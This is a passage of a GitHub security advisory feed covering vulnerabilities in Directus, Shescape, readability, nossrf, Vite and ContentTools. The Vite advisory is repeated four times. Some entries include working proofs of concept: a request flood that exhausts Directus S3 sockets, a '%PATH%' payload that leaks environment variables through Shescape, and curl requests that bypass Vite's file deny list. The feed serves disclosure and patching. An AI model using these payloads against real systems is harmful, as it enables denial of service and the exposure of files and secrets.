<p>When I was investigating this issue, I have found that after a burst of malformed asset transformation requests, the amount of <code>sockets</code> held on <a href="https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189">Agent on NodeHttpHandler</a> was always equal to <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>
<p>After looking into this <a href="https://github.com/aws/aws-sdk-js-v3/issues/6691">issue on AWS SDK</a> I found that if the <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href="https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L184">seen here</a> the stream is not consumed, because <code>sharp</code> will throw an error on the invalid arguments. For example <code>?height=xyz</code></p>
<p>The <a href="https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88">timeouts set here</a>  had no noticeable effect on tests made.</p>
<h3 id="poc">PoC</h3>
<p>This can be easily reproduced with the following steps:</p>
<ul>
<li>setup AWS S3 storage</li>
<li>set STORAGE_CLOUD_MAX_SOCKETS: "50" (this value is lower than default for easier reproduction)</li>
<li>upload a file to your project</li>
<li>run this file (Replace the the file ID with the one you just uploaded):</li>
</ul>
<pre><code class="language-ts">import axios from "axios";

async function start() {
  Array.from({ length: 400 }, (_, i) =&gt; {
    axios
      .get(
        "http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8?width=100&amp;height=XYZ"
      )
      .then(() =&gt; console.log("✅"))
      .catch((e) =&gt;
        console.log("⛔", e.response?.status || e.code || e.message)
      );
  });
}

start();
</code></pre>
<p>Here's an example:</p>
<p><a href="https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c">https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c</a></p>
<h3 id="impact">Impact</h3>
<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx">https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30225">https://nvd.nist.gov/vuln/detail/CVE-2025-30225</a></li>
<li><a href="https://github.com/advisories/GHSA-j8xj-7jff-46mx">https://github.com/advisories/GHSA-j8xj-7jff-46mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8xj-7jff-46mx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-26T17:19:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shescape] Shescape has potential environment variable exposure on Windows with CMD]]></title>
        <id>https://github.com/advisories/GHSA-66pp-5p9w-q87j</id>
        <link href="https://github.com/advisories/GHSA-66pp-5p9w-q87j"/>
        <updated>2025-03-26T14:54:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This impact users of Shescape on Windows that explicitly configure <code>shell: 'cmd.exe'</code> or <code>shell: true</code> using any of <code>quote</code>/<code>quoteAll</code>/<code>escape</code>/<code>escapeAll</code>.</p>
<p>An attacker may be able to get read-only access to environment variables. Example:</p>
<pre><code class="language-javascript">import * as cp from "node:child_process";
import { Shescape } from "shescape";

// 1. Prerequisites
const shescape = new Shescape({
    shell: "cmd.exe",
    // Or
    shell: true, // Only if the default shell is CMD
});

// 2. Payload
const payload = '"%PATH%';

// 3. Usage
let escapedPayload;

escapedPayload = shescape.quote(payload);
// Or
escapedPayload = shescape.quoteAll([payload]);
// Or
escapedPayload = shescape.escape(payload);
// Or
escapedPayload = shescape.escapeAll([payload]);

// And (example)
const result = cp.execSync(`echo Hello ${escapedPayload}`, options);

// 4. Impact
console.log(result.toString());
// Outputs "Hello" followed by the contents of the PATH environment variable
</code></pre>
<p>For Shescape prior to v2.0.0, the <code>options</code> object must have <code>shell: 'cmd.exe'</code> or <code>shell: undefined</code> and <code>interpolation: true</code>.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been patched in <a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2">v2.1.2</a> which you can upgrade to now.</p>
<p>If you are already using v2 of Shescape, no further changes are required. If you are using v1 of Shescape, follow the <a href="https://github.com/ericcornelissen/shescape/blob/155b13b4141750203ce71249f1b0fdc638c7a0d0/docs/migration.md">migration guide</a> to upgrade to v2. There is no plan to release a patch compatible with v1 of Shescape.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Alternatively, users can remove all instances of % from user input before using Shescape.</p>
<h3 id="references">References</h3>
<ul>
<li>Shescape Pull Request <a href="https://github.com/ericcornelissen/shescape/pull/1916">#1916</a></li>
<li>Shescape commit <a href="https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6">0a81f1e</a></li>
<li>Shescape release <a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2">v2.1.2</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<ul>
<li>Comment on Pull Request <a href="https://github.com/ericcornelissen/shescape/pull/1916">#1916</a></li>
<li>Comment on commit <a href="https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6">0a81f1e</a></li>
<li>Open an issue at <a href="https://github.com/ericcornelissen/shescape/issues">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30222">https://nvd.nist.gov/vuln/detail/CVE-2025-30222</a></li>
<li><a href="https://github.com/ericcornelissen/shescape/pull/1916">https://github.com/ericcornelissen/shescape/pull/1916</a></li>
<li><a href="https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6">https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6</a></li>
<li><a href="https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-66pp-5p9w-q87j">https://github.com/advisories/GHSA-66pp-5p9w-q87j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66pp-5p9w-q87j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T14:54:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mozilla/readability] @mozilla/readability Denial of Service through Regex]]></title>
        <id>https://github.com/advisories/GHSA-3p6v-hrg8-8qj7</id>
        <link href="https://github.com/advisories/GHSA-3p6v-hrg8-8qj7"/>
        <updated>2025-03-26T14:08:49.000Z</updated>
        <content type="html"><![CDATA[<p>Specially crafted titles may have caused a regular expression to excessively backtrack and cause a local denial of service.</p>
<p>Additional Details are <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1948833">available at Bugzilla</a></p>
<p>Credit: DayShift</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/readability/security/advisories/GHSA-3p6v-hrg8-8qj7">https://github.com/mozilla/readability/security/advisories/GHSA-3p6v-hrg8-8qj7</a></li>
<li><a href="https://github.com/mozilla/readability/commit/1c4d63be3e7344c3dfdf76ebb05fd0d32de93eb3">https://github.com/mozilla/readability/commit/1c4d63be3e7344c3dfdf76ebb05fd0d32de93eb3</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1948833">https://bugzilla.mozilla.org/show_bug.cgi?id=1948833</a></li>
<li><a href="https://github.com/advisories/GHSA-3p6v-hrg8-8qj7">https://github.com/advisories/GHSA-3p6v-hrg8-8qj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p6v-hrg8-8qj7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T14:08:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nossrf] nossrf Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-vm77-mr48-27wj</id>
        <link href="https://github.com/advisories/GHSA-vm77-mr48-27wj"/>
        <updated>2025-03-25T16:30:31.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package nossrf before 1.0.4 are vulnerable to Server-Side Request Forgery (SSRF) where an attacker can provide a hostname that resolves to a local or reserved IP address space and bypass the SSRF protection mechanism.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2691">https://nvd.nist.gov/vuln/detail/CVE-2025-2691</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-NOSSRF-9510842">https://security.snyk.io/vuln/SNYK-JS-NOSSRF-9510842</a></li>
<li><a href="https://github.com/advisories/GHSA-vm77-mr48-27wj">https://github.com/advisories/GHSA-vm77-mr48-27wj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm77-mr48-27wj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-23T15:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite bypasses server.fs.deny when using ?raw??]]></title>
        <id>https://github.com/advisories/GHSA-x574-m823-4x7w</id>
        <link href="https://github.com/advisories/GHSA-x574-m823-4x7w"/>
        <updated>2025-03-25T14:00:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>
<li><a href="https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>
<li><a href="https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>
<li><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>
<li><a href="https://github.com/advisories/GHSA-x574-m823-4x7w">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x574-m823-4x7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T14:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite bypasses server.fs.deny when using ?raw??]]></title>
        <id>https://github.com/advisories/GHSA-x574-m823-4x7w</id>
        <link href="https://github.com/advisories/GHSA-x574-m823-4x7w"/>
        <updated>2025-03-25T14:00:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>
<li><a href="https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>
<li><a href="https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>
<li><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>
<li><a href="https://github.com/advisories/GHSA-x574-m823-4x7w">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x574-m823-4x7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T14:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite bypasses server.fs.deny when using ?raw??]]></title>
        <id>https://github.com/advisories/GHSA-x574-m823-4x7w</id>
        <link href="https://github.com/advisories/GHSA-x574-m823-4x7w"/>
        <updated>2025-03-25T14:00:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>
<li><a href="https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>
<li><a href="https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>
<li><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>
<li><a href="https://github.com/advisories/GHSA-x574-m823-4x7w">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x574-m823-4x7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T14:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite bypasses server.fs.deny when using ?raw??]]></title>
        <id>https://github.com/advisories/GHSA-x574-m823-4x7w</id>
        <link href="https://github.com/advisories/GHSA-x574-m823-4x7w"/>
        <updated>2025-03-25T14:00:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>
<li><a href="https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>
<li><a href="https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>
<li><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>
<li><a href="https://github.com/advisories/GHSA-x574-m823-4x7w">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x574-m823-4x7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T14:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite bypasses server.fs.deny when using ?raw??]]></title>
        <id>https://github.com/advisories/GHSA-x574-m823-4x7w</id>
        <link href="https://github.com/advisories/GHSA-x574-m823-4x7w"/>
        <updated>2025-03-25T14:00:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" &gt; /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    &lt;body&gt;
      &lt;h1&gt;403 Restricted&lt;/h1&gt;
      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30208">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>
<li><a href="https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>
<li><a href="https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>
<li><a href="https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>
<li><a href="https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>
<li><a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>
<li><a href="https://github.com/advisories/GHSA-x574-m823-4x7w">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x574-m823-4x7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T14:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ContentTools] GetmeUK ContentTools Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-4f2v-2gpq-qhjg</id>
        <link href="https://github.com/advisories/GHSA-4f2v-2gpq-qhjg"/>
        <updated>2025-03-24T21:24:06.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in GetmeUK ContentTools up to 1.6.16. It has been rated as problematic. Affected by this issue is some unknown functionality of the component Image Handler. The manipulation of the argument onload leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2699">https://nvd.nist.gov/vuln/detail/CVE-2025-2699</a></li>
<li><a href="https://gist.github.com/Masamuneee/657f2e2b0eb5bf9b0d4dbb79f00dac37">https://gist.github.com/Masamuneee/657f2e2b0eb5bf9b0d4dbb79f00dac37</a></li>
<li><a href="https://vuldb.com/?ctiid.300716">https://vuldb.com/?ctiid.300716</a></li>
<li><a href="https://vuldb.com/?id.300716">https://vuldb.com/?id.300716</a></li>
<li><a href="https://vuldb.com/?submit.515864">https://vuldb.com/?submit.515864</a></li>
<li><a href="https://github.com/advisories/GHSA-4f2v-2gpq-qhjg">https://github.com/advisories/GHSA-4f2v-2gpq-qhjg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4f2v-2gpq-qhjg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-24T09:34:03.000Z</published>
    </entry>
</feed>